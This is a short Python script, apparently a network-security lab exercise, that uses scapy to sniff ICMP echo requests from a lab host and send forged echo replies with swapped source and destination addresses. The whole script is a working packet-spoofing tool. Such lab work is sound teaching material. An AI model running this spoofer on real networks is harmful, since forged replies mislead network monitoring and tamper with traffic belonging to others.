#!/usr/bin/python3
from scapy.all import *

def spoof_pkt(pkt):
	if ICMP in pkt and pkt[ICMP].type == 8:
		#Create IP packet with srcIP = destIP and vice-versa
		IPLayer = IP (src=pkt[IP].dst , dst=pkt[IP].src, 
				ihl=pkt[IP].ihl)
		#ICMP type = 0 - reply
		ICMPpkt = ICMP (type=0, id=pkt[ICMP].id, 
				seq= pkt[ICMP].seq)
		data = pkt[Raw].load
		#Create the new packet
		newpkt = IPLayer/ICMPpkt/data
		print ("*******spoofed reply packet*******")
		print ("Src IP:", newpkt[IP].src , 
			"Dest IP:", newpkt[IP]. dst)
		send (newpkt, verbose=0)

pkt = sniff (iface="enp0s3",
		filter='icmp and src host 10.0.2.15', 
		prn=spoof_pkt)

